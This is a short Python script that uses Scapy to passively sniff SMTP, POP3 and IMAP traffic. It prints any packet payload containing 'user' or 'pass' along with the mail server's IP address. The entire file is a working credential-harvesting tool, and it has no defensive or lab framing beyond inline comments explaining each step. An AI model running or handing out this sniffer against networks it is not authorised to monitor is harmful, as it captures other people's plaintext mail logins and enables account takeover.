# Import Scapy module
from scapy.all import *

# Define a function to be used as the callback for the sniffing function
def packet_callback(packet):
    # Check if the packet contains TCP payload
    if packet[TCP].payload:
        # Convert the payload to a string
        mail_packet = str(packet[TCP].payload)
        # Check if the string contains the words "user" or "pass"
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            # Print the destination IP address and payload contents
            print("[*] Server: {}".format(packet[IP].dst))
            print("[*] {}".format(packet[TCP].payload))

# Use Scapy's sniff function to capture network traffic
# Filter for packets with destination port 25 (SMTP), 110 (POP3), or 143 (IMAP)
# Call the packet_callback function for each captured packet
# Set store=0 to prevent storing captured packets in memory
sniff(filter="tcp port 25 or tcp port 110 or tcp port 143", prn=packet_callback, store=0)
